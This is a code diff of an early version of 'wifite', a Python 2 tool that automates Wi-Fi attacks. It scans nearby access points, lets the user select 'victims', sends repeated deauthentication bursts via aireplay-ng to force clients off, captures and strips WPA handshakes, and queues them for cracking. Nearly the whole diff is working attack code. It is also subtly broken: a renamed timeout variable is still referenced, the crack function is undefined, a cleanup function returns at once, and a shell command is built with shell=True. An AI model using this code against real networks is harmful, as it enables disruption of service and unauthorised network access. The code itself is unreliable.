@@ -1,5 +1,17 @@
 #!/usr/bin/python
 
+"""
+	wifite
+	
+	author: derv82 at gmail
+	
+	TODO:
+	 * WEP - everything	 
+	 * reaver-wps - integrate
+	 * WPA - crack (aircrack/pyrit/cowpatty)
+	 
+"""
+
 # For command-line arguments
 from sys import argv
 # For flushing STDOUT
@@ -22,12 +34,17 @@ import re
 REVISION = 83
 
 # WPA variables
-STRIP_HANDSHAKE   = True # use pyrit or tshark (if applicable) to strip handshake.
-WPA_TIMEOUT       = 10   # in seconds
-WPA_CAPS_TO_CRACK = []   # list of .cap files to crack (full of CapFile objects)
+STRIP_HANDSHAKE      = True # Use pyrit or tshark (if applicable) to strip handshake
+WPA_DEAUTH_TIMEOUT   = 10   # Time to wait between deauthentication bursts (in seconds)
+WPA_ATTACK_TIMEOUT   = 500  # Total time to allow for a handshake attack (in seconds)
+HANDSHAKE_DIR        = 'hs' # Directory in which handshakes .cap files are stored
+
+# Strip file path separator if needed
+if HANDSHAKE_DIR[-1] == os.sep: HANDSHAKE_DIR = HANDSHAKE_DIR[:-1]
 
 # Program variables
-TARGETS_REMAINING = 0
+TARGETS_REMAINING = 0  # Number of access points remaining to attack
+WPA_CAPS_TO_CRACK = [] # list of .cap files to crack (full of CapFile objects)
 
 # Console colors
 W  = "\033[0m"  # white (normal)
@@ -49,9 +66,10 @@ if not temp.endswith(os.sep):
 DN = open(os.devnull, 'w')
 
 class CapFile:
-	def __init__(self, filename, ssid):
+	def __init__(self, filename, ssid, bssid):
 		self.filename = filename
 		self.ssid = ssid
+		self.bssid = bssid
 
 class Target:
 	"""
@@ -92,12 +110,12 @@ class Client:
 		return s
 
 
-def scan(channel=0, iface='', bssid=''):
+def scan(channel=0, iface='', bssid='', first_try=True):
 	"""
 		Scans for access points. Asks user to select target(s).
 		Returns list of selected targets and list of clients.
 	"""
-	remove_airodump_files('wifite')
+	remove_airodump_files(temp + 'wifite')
 	
 	command = ['airodump-ng', 
 						'-a', # only show associated clients
@@ -117,10 +135,13 @@ def scan(channel=0, iface='', bssid=''):
 		while True:
 			time.sleep(0.3)
 			if not os.path.exists(temp + 'wifite-01.csv'):
-				print R + ' unable to generate airodump-ng CSV'
-				print R + ' you may want to disable & re-enable your wifi device'
-				exit_gracefully(1)
-			
+				if not first_try:
+					print R + ' unable to generate airodump-ng CSV'
+					print R + ' you may want to disable & re-enable your wifi device'
+					exit_gracefully(1)
+				call(['airmon-ng', 'stop', iface], stdout=DN, stderr=DN)
+				return scan(channel=channel, iface=iface, bssid=bssid, first_try=False)
+				
 			(targets, clients) = parse_csv(temp + 'wifite-01.csv')
 			print "\r scanning. %d target%s and %d client%s found" % (
 						len(targets), '' if len(targets) == 1 else 's', 
@@ -129,6 +150,7 @@ def scan(channel=0, iface='', bssid=''):
 	except KeyboardInterrupt: pass
 	
 	os.kill(proc.pid, SIGTERM)
+	remove_airodump_files(temp + 'wifite')
 	
 	print ''
 	
@@ -177,8 +199,7 @@ def scan(channel=0, iface='', bssid=''):
 		print ' no victims selected. exiting'
 		exit_gracefully(0)
 	
-	for vic in victims:
-		print str(vic)
+	print ' %d victim%s selected.' % (len(victims), '' if len(victims) == 1 else 's')
 	
 	return (victims, clients)
 
@@ -259,6 +280,11 @@ def get_iface():
 		print R + " The program will now exit."
 		exit_gracefully(0)
 	
+	elif len(monitors) == 1:
+		print ' '.join(['airmon-ng', 'start', monitors[0]])
+		call(['airmon-ng', 'start', monitors[0]], stdout=DN, stderr=DN)
+		return get_iface()
+	
 	print " Select a device to put into monitor mode:"
 	for i, monitor in enumerate(monitors):
 		print "  %d. %s" % (i + 1, monitor)
@@ -298,7 +324,7 @@ def has_handshake(target, capfile):
 	if program_exists('pyrit'):
 		# Call pyrit to "Analyze" the cap file's handshakes.
 		cmd = ['pyrit',
-					 '-r', capfile + '.temp',
+					 '-r', capfile,
 					 'analyze']
 		proc = Popen(cmd, stdout=PIPE, stderr=DN)
 		proc.wait()
@@ -321,15 +347,15 @@ def has_handshake(target, capfile):
 		
 	# Check for handshake using aircrack-ng
 	elif program_exists('aircrack-ng'):
-		crack = 'echo "" | aircrack-ng -a 2 -w - -e "' + target.ssid + '" ' + temp + 'wpa-01.cap'
+		crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + target.bssid + ' ' + capfile
 		proc_crack = Popen(crack, stdout=PIPE, stderr=DN, shell=True)
 		proc_crack.wait()
 		txt = proc_crack.communicate()[0]
 		
 		return txt.find('Passphrase not in dictionary') != -1
 	
-	print "\n aircrack-ng not found; Wifite is unable to check for handshakes!"
-	print " Please install aircrack-ng before running this script."
+	print "\n aircrack-ng not found; wifite is unable to check for handshakes!"
+	print " please install aircrack-ng before running this script."
 	gracefully_exit(-1)
 
 
@@ -338,6 +364,7 @@ def remove_airodump_files(prefix):
 		Removes airodump output files for whatever file prefix ('wpa', 'wep', etc)
 		Used by attack_wpa() and attack_wep()
 	"""
+	return
 	try: 
 		os.remove(prefix + '-01.cap')
 		os.remove(prefix + '-01.csv')
@@ -353,6 +380,27 @@ def program_exists(program):
 	proc = Popen(['which', program], stdout=PIPE)
 	return proc.communicate()[0].strip() != ''
 
+def strip_handshake(capfile):
+	if program_exists('pyrit'):
+		cmd = ['pyrit',
+				 '-r', capfile,
+				 '-o', capfile,
+				 'strip']
+		call(cmd,stdout=DN, stderr=DN)
+		
+	elif program_exists('tshark'):
+		# strip results with tshark
+		cmd = ['tshark',
+					 '-r', capfile,      # input file
+					 '-R', 'eapol || wlan_mgt.tag.interpretation', # filter
+					 '-w', capfile + '.temp'] # output file
+		proc_strip = call(cmd, stdout=DN, stderr=DN)
+		
+		try: os.rename(capfile + '.temp', capfile)
+		except OSError:
+			call(['mv', capfile + '.temp', capfile])
+	else:
+		print " unable to strip .cap file: neither pyrit nor tshark were found"
 
 def attack_wpa(iface, target, clients):
 	""" 
@@ -360,22 +408,23 @@ def attack_wpa(iface, target, clients):
 		During the capture, sends deauthentication packets to the target both as
 		general deauthentication packets and specific packets aimed at connected clients.
 		Waits until a handshake is captured.
+		Returns True if handshake was found, False otherwise
 	"""
 	
 	global STRIP_HANDSHAKE, WPA_TIMEOUT, TARGETS_REMAINING
 	
 	# Generate the filename to save the .cap file as
-	save_as = "hs" + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '.cap'
+	save_as = HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '.cap'
 	
 	# Check if we already have a handshake for this SSID...
 	if os.path.exists(save_as):
 		print '.cap file already exists for %s, skipping.' % target.ssid
-		return ''
+		return False
 		"""
 		save_index = 1
-		while os.path.exists("hs" + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '-' + save_index + '.cap'):
+		while os.path.exists(HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '-' + save_index + '.cap'):
 			save_index += 1
-		save_as = "hs" + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '-' + save_index + '.cap'
+		save_as = HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '-' + save_index + '.cap'
 		"""
 	
 	# Remove previous airodump output files (if needed)
@@ -395,45 +444,51 @@ def attack_wpa(iface, target, clients):
 		print 'starting wpa handshake capture'
 		got_handshake = False
 		
+		seconds_running = 0
+		
 		target_clients = []
 		client_index = -1
-		# Build list of clients solely connected to target access point
+		# Build a new list of clients which are connected to target access point
 		for c in clients:
 			if c.station == target.bssid:
 				target_clients.append(c)
 		
 		# Deauth and check-for-handshake loop
 		while not got_handshake:
-			# Send deauth packets via aireplay-ng
-			cmd = ['aireplay-ng', 
-						'-0',  # Attack method (Deauthentication)
-						 '3',  # Number of packets to send
-						'-a', target.bssid]
 			
-			if client_index == -1: 
-				print "sending 3 deauth packets from *broadcast*",
-			elif len(target_clients) > 0:
-				print "sending 3 deauth packets from %s" % target_clients[client_index].bssid,
-				cmd.append('-h')
-				cmd.append(target_clients[client_index].bssid)
+			time.sleep(1)
+			seconds_running += 1
 			
-			client_index += 1
-			if client_index >= len(target_clients): client_index = -1
-			cmd.append(iface)
+			if seconds_running % WPA_TIMEOUT == 0: 
+				# Send deauth packets via aireplay-ng
+				cmd = ['aireplay-ng', 
+							'-0',  # Attack method (Deauthentication)
+							 '3',  # Number of packets to send
+							'-a', target.bssid]
 			
-			# Send deauth packets via aireplay, wait for them to complete.
-			proc_deauth = Popen(cmd, stdout=DN, stderr=DN)
-			proc_deauth.wait()
-			print "sent"
+				if client_index == -1 or len(target_clients) == 0:
+					print "sending 3 deauth packets from *broadcast*",
+				else:
+					print "sending 3 deauth packets from %s" % target_clients[client_index].bssid,
+					cmd.append('-h')
+					cmd.append(target_clients[client_index].bssid)
+				client_index += 1
+				if client_index >= len(target_clients): client_index = -1
+				cmd.append(iface)
 			
-			# Copy current dump file (take snapshot of it)
+				# Send deauth packets via aireplay, wait for them to complete.
+				proc_deauth = Popen(cmd, stdout=DN, stderr=DN)
+				proc_deauth.wait()
+				print "sent"
+			
+			# Copy current dump file for consistency
 			call(['cp', temp + 'wpa-01.cap', temp + 'wpa-01.cap.temp'])
 			
-			# Check for handshake using aircrack
+			# Check for handshake
 			if has_handshake(target, temp + 'wpa-01.cap.temp'):
 				got_handshake = True
 				
-				try: os.mkdir('hs' + os.sep)
+				try: os.mkdir(HANDSHAKE_DIR + os.sep)
 				except OSError: pass
 				
 				# Kill the airodump and aireplay processes
@@ -444,38 +499,21 @@ def attack_wpa(iface, target, clients):
 				# except UnboundLocalError: pass
 				
 				# Copy the cap file for safe-keeping
-				try: os.rename(temp + 'wpa-01.cap.temp', save_as)
-				except OSError:
-					call(['mv', temp + 'wpa-01.cap.temp', save_as])
+				os.rename(temp + 'wpa-01.cap.temp', save_as)
 				
 				print 'handshake captured! saved as "' + save_as + '"'
 				
-				# strip handshake if user requested it
-				if STRIP_HANDSHAKE:
-					if program_exists('pyrit'):
-						cmd = ['pyrit',
-								 '-r', save_as,
-								 '-o', save_as,
-								 'strip']
-						call(cmd,stdout=DN, stderr=DN)
-						
-					elif program_exists('tshark'):
-						# strip results with tshark
-						cmd = ['tshark',
-									 '-r', save_as,      # input file
-									 '-R', 'eapol || wlan_mgt.tag.interpretation', # filter
-									 '-w', save_as + '.temp'] # output file
-						proc_strip = call(cmd, stdout=DN, stderr=DN)
-						
-						try: os.rename(save_as + '.temp', save_as)
-						except OSError:
-							call(['mv', save_as + '.temp', save_as])
+				# Strip handshake if needed
+				if STRIP_HANDSHAKE: strip_handshake(save_as)
 				
-				# add the filename and SSID to the list of 'to-crack' after everything's done
-				WPA_CAPS_TO_CRACK.append(CapFile(save_as, target.ssid))
-				break
+				# Add the filename and SSID to the list of 'to-crack'
+				# Cracking will be handled after all attacks are finished.
+				WPA_CAPS_TO_CRACK.append(CapFile(save_as, target.ssid, target.bssid))
 				
-			# no handshake yet
+				break # Break out of while loop
+				
+			# No handshake yet
+			os.remove(temp + 'wpa-01.cap.temp')
 			time.sleep(WPA_TIMEOUT)
 			
 			# Check the airodump output file for new clients
@@ -498,9 +536,11 @@ def attack_wpa(iface, target, clients):
 	
 	except KeyboardInterrupt: 
 		print " (^C) attack interrupted"
-		# TODO Menu system to either continue attacking or start cracking.
+		# If there are more targets to attack, ask what to do next
 		if TARGETS_REMAINING > 0:
-			print " %d targets remain" % TARGETS_REMAINING
+			print " %d target%s remain%s" % (TARGETS_REMAINING, 
+									'' if TARGETS_REMAINING == 1 else 's', 
+									's' if TARGETS_REMAINING == 1 else '')
 			print " please make a selection:"
 			print "   [c]ontinue attacking targets"
 			if len(WPA_CAPS_TO_CRACK) > 0:
@@ -509,13 +549,12 @@ def attack_wpa(iface, target, clients):
 			ri = ''
 			while ri != 'c' and ri != 's' and ri != 'e': 
 				ri = raw_input()
-			if ri == 's':
-				TARGETS_REMAINING = 0
+			
+			if ri == 's': TARGETS_REMAINING = 0 # Tells start() to ignore other attacks
 			elif ri == 'e':
 				print " the program will now exit."
 				exit_gracefully(0)
-				
-	
+		
 	# clean up
 	remove_airodump_files(temp + 'wpa')
 	try:
@@ -524,6 +563,14 @@ def attack_wpa(iface, target, clients):
 	except OSError: pass
 	#except UnboundLocalError: pass
 	
+	return got_handshake
+
+
+def attack_wep(iface, target, clients):
+	"""
+		
+	"""
+	pass
 
 
 def start():
@@ -531,6 +578,9 @@ def start():
 	
 	iface = get_iface()
 	(targets, clients) = scan(iface=iface)
+	
+	successful_wpa = 0
+	successful_wep = 0
 	
 	TARGETS_REMAINING = len(targets)
 	for t in targets:
@@ -544,15 +594,25 @@ def start():
 				ts_clients.append(c)
 		
 		if t.encryption.find('WPA') != -1:
-			attack_wpa(iface, t, ts_clients)
+			if attack_wpa(iface, t, ts_clients):
+				successful_wpa += 1
 			
 		elif t.encryption.find('WEP') != -1:
-			attack_wep(iface, t, ts_clients)
+			if attack_wep(iface, t, ts_clients):
+				successful_wep += 1
+		
+		else: print ' unknown encryption:',t.encryption
 		
 		# If user wants to stop attacking
 		if TARGETS_REMAINING == 0: break
-		
-		else: print ' unknown encryption:',t.encryption
+	
+	print 'attacks completed.'
+	
+	caps = len(WPA_CAPS_TO_CRACK)
+	if caps > 0:
+		print ' beginning WPA crack on %d handshake%s' % (caps, '' if caps == 1 else 's')
+		for cap in WPA_CAPS_TO_CRACK:
+			wpa_crack(cap.filename, cap.ssid)
 
 def exit_gracefully(code):
 	for file in os.listdir(temp):
